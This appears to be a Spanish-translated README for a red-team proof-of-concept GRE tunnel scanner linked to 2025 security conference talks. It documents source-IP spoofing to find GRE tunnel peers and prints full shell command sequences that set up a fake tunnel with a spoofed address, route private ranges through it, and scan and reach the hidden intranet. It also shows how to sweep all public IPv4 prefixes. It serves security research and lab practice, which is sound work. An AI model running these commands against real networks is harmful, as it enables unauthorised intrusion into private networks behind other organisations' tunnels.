# Escáner de túnel GRE
## ⚠️⚠️⚠️ IMPORTANTE ⚠️⚠️⚠️
### ⚠️Esta herramienta incluye suplantación de direcciones IP de origen. Por favor, asegúrese de tener autorización legal para usarla.⚠️
## Referencia
- Este es un código PoC para charlas: De la suplantación al túnel: Nuevas técnicas de red del equipo rojo para acceso inicial y evasión
    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## Preparar
- `pip3 install requirement.txt`
## Uso
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## Ejemplo
- por ejemplo `1.1.1.1` y `2.2.2.2` tienen túnel gre tú eres `3.3.3.3`
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- Y obtener cómo abusar del túnel GRE
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
- si conoces el endpoint pero no conoces la dirección del par, puedes hacer algo así
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`
  - recibirás respuesta de 8.8.8.8 mientras obtienes el par correcto

- configuración predeterminada alrededor de 500 paquetes/seg.
## opciones
- `-sch`: Muestra la hoja de referencia y sale (Introduce -i -lh -s -d que encontraste y luego obtén el comando para abusar del túnel GRE)
- `-l3`: Interfaz de túnel de Capa 3 (Por defecto: Falso)
- `-r`: Coloca la información de IP destino GRE en ICMP (Por defecto: Coloca la información de IP origen GRE)
- `-ss`: Guarda y usa archivo de estado (el último escaneo se reanudará) (Por defecto: Falso)
  - Recomendado "on" en sistemas de escaneo masivo que a veces matan el script
- `-i <interfaz>`: Interfaz para enviar paquetes
- `-s <ip_o_archivo>`: Una subred IP o una lista de IPs (subredes) para usar como origen GRE
- `-d <ip_o_archivo>`: Una subred IP o una lista de IPs (subredes) para usar como destino GRE
- `-L <archivo>`: escanea una lista de pares GRE
  - cada línea del archivo se ve así `1.1.1.1,2.2.2.2`
- `-lh <ip>`: Una IP en tu interfaz pública (la IP en la interfaz -i)
- `-o <archivo>`: Ruta del archivo de registro
- `-t <float>`: Espera cuántos segundos después de enviar el paquete GRE (Por defecto: 2)
- `-T <int>`: Cuántos hilos envían paquetes GRE al mismo tiempo (Por defecto: 255)
- `-cs <int>`: Envía cuántas IP hasta comenzar a esperar la respuesta ping (por defecto: 1000)
- `-dp`: Escanear IP privada - escanear GRE de IP privada (Por defecto: Falso)
- `-id <ip>`: Dirección destino ICMP interna (Por defecto: igual que destino GRE)
  - Usa esto si conoces la dirección de intranet interna
- `-v <nivel_log>`: Nivel de registro `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Por defecto: INFO)
  - El registro de pares GRE encontrados está en `CRITICAL`


## mejor manera de escanear toda la IP pública

```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```

## Laboratorio
### Video de demostración
- [Youtube](https://youtu.be/DDvfYl5-J28)
### Escanear túnel GRE
`python3 main.py -i <iface> -lh <tu_ip> -s 1.1.1.1 -d 160.25.104.199`
### Acceder y escanear intranet
```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
## Descargo de responsabilidad
Este proyecto está destinado únicamente a fines educativos y de investigación. Cualquier acción y/o actividad relacionada con este código es responsabilidad exclusiva del usuario. Los autores y colaboradores no se hacen responsables de ningún uso indebido o daño causado por este proyecto. Por favor, asegúrese de tener la autorización adecuada antes de probar, usar o implementar cualquier parte de este código en cualquier entorno. El uso no autorizado de este código puede violar leyes locales, estatales y federales.

## Licencia
Este proyecto está licenciado bajo los términos de la licencia MIT.




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---